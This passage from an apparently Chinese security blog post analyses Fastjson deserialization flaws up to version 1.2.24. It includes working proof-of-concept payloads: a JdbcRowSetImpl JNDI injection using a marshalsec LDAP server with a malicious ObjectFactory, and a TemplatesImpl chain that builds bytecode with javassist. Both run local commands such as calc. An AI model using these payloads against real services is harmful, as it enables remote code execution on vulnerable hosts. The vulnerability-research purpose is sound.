class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getAge方法被自动调用！"</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"setAge方法被自动调用！"</span>);</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getName方法被自动调用！"</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"setName方法被自动调用！"</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Main.java</p><p>调用<code>com.alibaba.fastjson.JSON</code>将JSON文本解析为对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//创建一个用于实验的user类</span></span><br><span class="line">        User user1 = <span class="keyword">new</span> User();</span><br><span class="line">        user1.setName(<span class="string">"Str3am"</span>);</span><br><span class="line">        user1.setAge(<span class="number">11</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="comment">//SerializerFeature.WriteClassName 添加 @type，指定反序列化的类，也可以不用添加</span></span><br><span class="line">        String serializedStr = JSON.toJSONString(user1, SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(<span class="string">"serializedStr="</span>+serializedStr);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//通过parse方法进行反序列化，返回的是一个JSONObject</span></span><br><span class="line">        Object obj1 = JSON.parse(serializedStr);</span><br><span class="line">        System.out.println(<span class="string">"parse反序列化对象名称:"</span>+obj1.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">"parse反序列化："</span>+obj1);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//通过parseObject,不指定类，返回的是一个JSONObject</span></span><br><span class="line">        Object obj2 = JSON.parseObject(serializedStr);</span><br><span class="line">        System.out.println(<span class="string">"parseObject反序列化对象名称:"</span>+obj2.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">"parseObject反序列化:"</span>+obj2);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//通过parseObject,指定类后返回的是一个相应的类对象</span></span><br><span class="line">        Object obj3 = JSON.parseObject(serializedStr,User<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        System.out.println(<span class="string">"parseObject反序列化对象名称:"</span>+obj3.getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">"parseObject反序列化:"</span>+obj3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/10/29/Java_06/20210804194633.png" alt="image-20210804194632670"></p><p>Fastjson提供特殊字符段<code>@type</code>，这个字段可以指定反序列化任意类，并且会自动调用类中属性的特定的set，get方法。</p><ul><li>public修饰符的属性会进行反序列化赋值，private修饰符的属性不会直接进行反序列化赋值，而是会调用setxxx(xxx为属性名)的函数进行赋值。</li><li>getxxx(xxx为属性名)的函数会根据函数返回值的不同，而选择被调用或不被调用</li></ul><p>三种反序列化函数除了返回结果不同之外，在执行过程的调用函数上也有不同。</p><p>从上面的例子我们可以看出，在对json字符串进行反序列化的时候，会调用对应类的setter和getter方法，不同函数的调用规则如下：</p><ul><li><p>toJSONString() 会调用目标类的所有getter方法</p></li><li><p>parse(“”) 会识别并调用目标类的特定 setter 方法及特定的 getter 方法</p></li><li><p>parseObject(“”) 会调用反序列化目标类的特定 setter 和 getter 方法</p></li><li><p>parseObject(“”,class) 会识别并调用目标类的特定 setter 方法及特定的 getter 方法</p></li></ul><p><strong>特定的setter方法要求如下：</strong></p><ul><li>方法名长度大于4且以set开头，且第四个字母要是大写</li><li>非静态方法</li><li>返回类型为void或当前类</li><li>参数个数为1个</li></ul><p><strong>特定的getter方法要求如下：</strong></p><ul><li>方法名长度大于等于4</li><li>非静态方法</li><li>以get开头且第4个字母为大写</li><li>无传入参数</li><li>返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong</li></ul><p>（我自己在测试的时候发现没有带<code>@type</code>标识符时，并不是按照这个规律，这里存疑）</p><p>因为这个特定的调用规则的原因，所以对于<code>@type</code>才不会调用其getter和setter方法。<strong>特定规则其实总结起来就是一般的setter方法以及一般的返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong的getter方法</strong></p><p>下面这个例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String json=<span class="string">"&#123;\"table\":&#123;&#125;&#125;"</span>;</span><br><span class="line">        Foo foo=JSON.parseObject(json,Foo<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Hashtable table;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Hashtable <span class="title">getTable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getter"</span>);</span><br><span class="line">        <span class="keyword">return</span> table;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/10/29/Java_06/20210804210556.png" alt="image-20210804210555879"></p><p>Hashtable继承了Map，所以在反序列化的时候会调用getTable方法</p><h2 id="ver-lt-1-2-24"><a href="#ver-lt-1-2-24" class="headerlink" title="ver&lt;=1.2.24"></a>ver&lt;=1.2.24</h2><h3 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h3><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>JNDI注入利用链是最通用的方式，在以下三种情况都可以使用</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">parse</span><span class="params">(jsonStr)</span></span></span><br><span class="line"><span class="function"><span class="title">parseObject</span><span class="params">(jsonStr)</span></span></span><br><span class="line"><span class="function"><span class="title">parseObject</span><span class="params">(jsonStr,Object.class)</span></span></span><br></pre></td></tr></table></figure><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>jdk1.8.0_161</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String json = <span class="string">"&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\",\"autoCommit\":true&#125;"</span>;</span><br><span class="line">        JSON.parse(json);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>起一个ldap服务</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span>.<span class="number">3</span>-SNAPSHOT-all<span class="selector-class">.jar</span> marshalsec<span class="selector-class">.jndi</span><span class="selector-class">.LDAPRefServer</span> http:<span class="comment">//127.0.0.1:8090/#ExecTest</span></span><br></pre></td></tr></table></figure><p>ExecTest.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExecTest</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ExecTest</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object var1, Name var2, Context var3, Hashtable&lt;?, ?&gt; var4)</span> </span>&#123;</span><br><span class="line">        exec(<span class="string">"xterm"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">exec</span><span class="params">(String var0)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"calc.exe"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var2) &#123;</span><br><span class="line">            var2.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] var0)</span> </span>&#123;</span><br><span class="line">        exec(<span class="string">"123"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译后（编译使用的是jdk1.8.0_251，运行环境是在jdk1.8.0_161，这样测试也是可以jndi注入的）在8090端口起一个web服务</p><p><img src="/2021/10/29/Java_06/20211011200852.png" alt="image-20211011200843637"></p><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>JdbcRowSetImpl把JNDI注入衍生到了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CLIENT</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        JdbcRowSetImpl JdbcRowSetImpl_inc = <span class="keyword">new</span> JdbcRowSetImpl();<span class="comment">//只是为了方便调用</span></span><br><span class="line">        JdbcRowSetImpl_inc.setDataSourceName(<span class="string">"rmi://127.0.0.1:1099/aa"</span>);<span class="comment">//可控uri</span></span><br><span class="line">        JdbcRowSetImpl_inc.setAutoCommit(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么只需要调用这两个set方法，这两个函数接口</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> setDataSourceName(<span class="keyword">String</span> var1) <span class="keyword">throws</span> SQLException</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> setAutoCommit(<span class="built_in">boolean</span> var1)<span class="keyword">throws</span> SQLException</span><br></pre></td></tr></table></figure><p>可以看到是满足特殊setter的条件的</p><h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><h4 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h4><p>需要以下格式</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">JSON</span>.</span></span>parse<span class="constructor">Object(<span class="params">input</span>, Object.<span class="params">class</span>, Feature.SupportNonPublicField)</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">JSON</span>.</span></span>parse(text1,Feature.SupportNonPublicField)</span><br></pre></td></tr></table></figure><p>这是因为POC中有一些private属性，而且<code>TemplatesImpl</code>类中没有相应的set方法，所以需要传入该参数让其支持非public属性，当然如果private属性存在相应set方法的话，FastJson会自动调用其set方法完成赋值，不需要<code>Feature.SupportNonPublicField</code>参数</p><h4 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>JDK1.7_21</p><p>pom.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.12.0.GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.directory.studio<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>org.apache.commons.codec<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.*;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();<span class="comment">//ClassPool对象是一个表示class文件的CtClass对象的容器</span></span><br><span class="line">        CtClass cc = pool.makeClass(<span class="string">"Evil"</span>);<span class="comment">//创建Evil类</span></span><br><span class="line">        cc.setSuperclass((pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())))</span>;<span class="comment">//设置Evil类的父类为AbstractTranslet</span></span><br><span class="line">        CtConstructor cons = <span class="keyword">new</span> CtConstructor(<span class="keyword">new</span> CtClass[]&#123;&#125;, cc);<span class="comment">//创建无参构造函数</span></span><br><span class="line">        cons.setBody(<span class="string">"&#123; Runtime.getRuntime().exec(\"calc\"); &#125;"</span>);<span class="comment">//设置无参构造函数体</span></span><br><span class="line">        cc.addConstructor(cons);<span class="comment">//添加构造函数</span></span><br><span class="line">        <span class="keyword">byte</span>[] byteCode=cc.toBytecode();<span class="comment">//toBytecode得到Evil类的字节码</span></span><br><span class="line"> </span><br><span class="line">        String evilCode=Base64.encodeBase64String(byteCode);</span><br><span class="line"> </span><br><span class="line">        String poc=<span class="string">"&#123;\n"</span> +</span><br><span class="line">                "\"@type\":\""+ TemplatesImpl.class.getName()+"\",\n" +</span><br><span class="line">                <span class="string">"\"_bytecodes\":[\""</span>+evilCode+<span class="string">"\"],\n"</span> +</span><br><span class="line">                <span class="string">"\"_name\":\"xx\",\n"</span> +</span><br><span class="line">                <span class="string">"\"_tfactory\":&#123; &#125;,\n"</span> +</span><br><span class="line">                <span class="string">"\"_outputProperties\":&#123; &#125;\n"</span> +</span><br><span class="line">                <span class="string">"&#125;"</span>;</span><br><span class="line"> </span><br><span class="line">        System.out.println(poc);</span><br><span class="line"> </span><br><span class="line">        JSON.parse(poc, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/10/29/Java_06/20211012202536.png" alt="image-20211012202528192"></p><h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>Jdk7u21后面是调用到了<code>TemplatesImpl.getOutputProperties()</code>，函数原型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title">getOutputProperties</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>Properties继承自Hashtables，实现了Map，符合特殊getter的条件</p><p>Jdk7u21的TemplatesImple类需要满足如下条件</p><ol><li>TemplatesImpl类的 <code>_name</code> 变量 != null</li><li>TemplatesImpl类的<code>_class</code>变量 == null</li><li>TemplatesImpl类的 <code>_bytecodes</code> 变量 != null</li><li>TemplatesImpl类的<code>_bytecodes</code>是我们代码执行的类的字节码。<code>_bytecodes</code>中的类必须是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>的子类</li><li>我们需要执行的恶意代码写在<code>_bytecodes</code> 变量对应的类的静态方法或构造方法中。</li><li>TemplatesImpl类的<code>_tfactory</code>需要是一个拥有getExternalExtensionsMap()方法的类，使用jdk自带的TransformerFactoryImpl类</li></ol><p>对比上面那个poc就会有以下几个问题</p><p><strong><code>_tfactory</code>为什么为空？</strong></p><p>当赋值的值为一个空的Object对象时，会新建一个需要赋值的字段应有的格式的新对象实例，应有的格式即变量在源码中的定义</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * A reference to the transformer factory that this templates</span></span><br><span class="line"><span class="comment">     * object belongs to.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> TransformerFactoryImpl _tfactory = <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure><p><strong><code>_bytecodes</code>需要base64编码？</strong></p><p>FastJson提取byte[]数组字段值时会进行Base64解码</p><p>com.alibaba.fastjson.serializer.ObjectArrayCodec#deserialze</p><p><img src="/2021/10/29/Java_06/20211014195514.png" alt="image-20211014195506705"></p><p>com.alibaba.fastjson.parser.JSONScanner#bytesValue</p><p><img src="/2021/10/29/Java_06/20211014195554.png" alt="image-20211014195553211"></p><p><strong>_outputProperties</strong></p><p>FastJson对变量赋值的逻辑在<code>parseField</code>中实现</p><p>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#parseField</p><p><img src="/2021/10/29/Java_06/20211014195926.png" alt="image-20211014195925620"></p><p>key即为传入的属性名，经过了<code>smartMatch</code>处理</p><p>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch</p><p>会替换掉字段key中的<code>_</code>和<code>-</code>，所以删除POC里的<code>_</code>或者添加<code>-</code>都是可以的</p><h3 id="漏洞修复checkAutoType"><a href="#漏洞修复checkAutoType" class="headerlink" title="漏洞修复checkAutoType"></a>漏洞修复checkAutoType</h3><p>在1.2.25版本之后，autotype功能受到了限制，autotype默认是关闭的，这时采用白名单判断反序列化的类名，可以手动添加白名单列表。手动开启autotype之后，使用黑名单方式来判断，同样黑名单也可以自定义。配置详情可以参考官网wiki：</p><p><a href="https://github.com/alibaba/fastjson/wiki/enable_autotype" target="_blank" rel="noopener">https://github.com/alibaba/fastjson/wiki/enable_autotype</a></p><p>当autotype关闭的时候，这里以1.2.25版本为例</p><p><img src="/2021/10/29/Java_06/20211015170352.png" alt="image-20211015170344364"></p><p>可以看到1.2.24版本再遇到<code>@type</code>标记的时候，会直接加载指定的类，1.2.25版本则会先进入checkAutoType函数进行判断</p><p>com.alibaba.fastjson.parser.ParserConfig#checkAutoType</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">        <span class="keyword">if</span> (typeName == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">final</span> String className = typeName.replace(<span class="string">'$'</span>, <span class="string">'.'</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//一些固定类型的判断，此处不会对clazz进行赋值，此处省略</span></span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">            <span class="comment">//进行黑名单匹配，匹配中，直接报错退出</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">                String deny = denyList[i];</span><br><span class="line">                <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span 